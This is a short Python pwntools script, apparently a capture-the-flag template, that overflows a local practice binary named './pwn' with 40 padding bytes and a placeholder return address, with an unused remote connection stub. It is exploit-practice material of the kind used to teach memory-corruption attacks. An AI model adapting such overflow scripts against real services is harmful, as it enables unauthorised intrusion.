#!/usr/bin/python3
from pwn import *

class con:
	def local():
		elf = ELF("./pwn")
		p = elf.process()
		return p
	def remote():
		p = remote("ip_addr", port)
		return p
def exploit():
	p = con.local()
	print(p.recvline())
	offset = 40
	addr = p32(0xdeadbeed)
	payload = b"A"*offset + addr 
	print(payload)
	p.sendline(payload)
	print(p.recvall())
if __name__ == "__main__":
	exploit()	
